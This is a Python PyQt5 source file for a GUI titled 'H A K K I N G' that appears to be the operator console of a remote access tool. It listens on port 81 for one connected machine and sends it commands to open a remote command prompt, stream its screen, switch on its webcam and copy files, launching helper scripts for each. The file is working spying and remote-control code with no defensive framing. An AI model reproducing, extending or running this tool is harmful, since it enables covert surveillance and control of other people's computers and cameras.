#import os
#from lib.host import ipadd
import sys
import subprocess
import json
import glob
import time
import base64
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import QSize
from PyQt5.QtGui import QMovie, QPainter, QPixmap
from PyQt5.QtWidgets import QApplication, QMainWindow, QPushButton, QWidget
import pyautogui
import socket
from lib.host import ipadd


class Ui_MainWindow(QtWidgets.QMainWindow, QtCore.QThread):

    def __init__(self, parent=None):
        QtWidgets.QWidget.__init__(self, parent)
        print("1")
        self.setObjectName("H A K K I N G")
        self.setWindowTitle("H A K K I N G")
        self.resize(400, 600)
        self.setGraphicsEffect
        self.setMouseTracking(True)
        print("2")
        self.movie = QMovie("lib/GIF/giftem.gif")
        self.movie.frameChanged.connect(self.repaint)
        self.movie.start()

        self.btn = QtWidgets.QPushButton(self)
        # self.btn.setStyleSheet('''border-image: url("win.jpg")''')
        self.btn.setText("Windows Trans")
        self.btn.setStyleSheet('background: rgba(9, 255, 5, 0.5);')
        self.btn.setFixedWidth(200)
        self.btn.setFixedHeight(100)
        self.btn.move(0, 100)
        self.btn.clicked.connect(self.shareWin)

        self.btn2 = QtWidgets.QPushButton(self)
        self.btn2.setText("C M D")
        self.btn2.setStyleSheet('background: rgba(9, 255, 5, 0.5);')
        self.btn2.setFixedWidth(200)
        self.btn2.setFixedHeight(100)
        self.btn2.move(200, 100)
        self.btn2.clicked.connect(self.CMDConect)

        self.btn3 = QtWidgets.QPushButton(self)
        self.btn3.setText("C A M")
        self.btn3.setStyleSheet('background: rgba(9, 255, 5, 0.5);')
        self.btn3.setFixedWidth(200)
        self.btn3.setFixedHeight(100)
        self.btn3.move(0, 300)
        self.btn3.clicked.connect(self.CAM)

        self.btn4 = QtWidgets.QPushButton(self)
        self.btn4.setText("B R E A K")
        self.btn4.setStyleSheet('background: rgba(9, 255, 5, 0.5);')
        self.btn4.setFixedWidth(200)
        self.btn4.setFixedHeight(100)
        self.btn4.move(200, 300)
        self.btn4.clicked.connect(self.CopyFile)
        print("3")
        self.btn5 = QtWidgets.QPushButton(self)
        self.btn5.setText("EXIT")
        self.btn5.setStyleSheet('background: rgba(255, 0, 0, 0.5);')
        self.btn5.setFixedWidth(400)
        self.btn5.setFixedHeight(100)
        self.btn5.move(0, 500)
        self.btn5.clicked.connect(self.EXIT)
        print("4")
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = ipadd
        self.port = 81
        self.s.bind((self.host, self.port))
        self.s.listen(1)
        self.conn, self.addr = self.s.accept()

    def paintEvent(self, event):
        currentFrame = self.movie.currentPixmap()
        frameRect = currentFrame.rect()
        frameRect.moveCenter(self.rect().center())
        if frameRect.intersects(event.rect()):
            painter = QPainter(self)
            painter.drawPixmap(frameRect.left(), frameRect.top(), currentFrame)

    def CMDConect(self):
        self.a = 'cmd'
        self.conn.send(self.a.encode())
        print(f"shareWin = {self.a}")
        subprocess.call('start cmdd.py', shell=True)

        self.a = 'X'
        self.conn.send(self.a.encode())
        print(f"shareWin = {self.a}")

    def CopyFile(self):
        self.a = 'cpfl'
        self.conn.send(self.a.encode())
        print(f"shareWin = {self.a}")
        #subprocess.call('start server.py', shell=True)

        self.a = 'X'
        self.conn.send(self.a.encode())
        print(f"shareWin = {self.a}")

    def shareWin(self):
        self.a = 'win'
        self.conn.send(self.a.encode())
        print(f"shareWin = {self.a}")
        subprocess.call('start wintrans.py', shell=True)

        self.a = 'X'
        self.conn.send(self.a.encode())
        print(f"shareWin = {self.a}")

    def CAM(self):
        self.a = 'cam'
        self.conn.send(self.a.encode())
        print(f"shareWin = {self.a}")
        subprocess.call('start camtrans.py', shell=True)

        self.a = 'X'
        self.conn.send(self.a.encode())
        print(f"shareWin = {self.a}")

    def EXIT(self):
        self.command = 'X'


print("start")
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    myapp = Ui_MainWindow()
    print("sss")
    myapp.show()
    sys.exit(app.exec_())
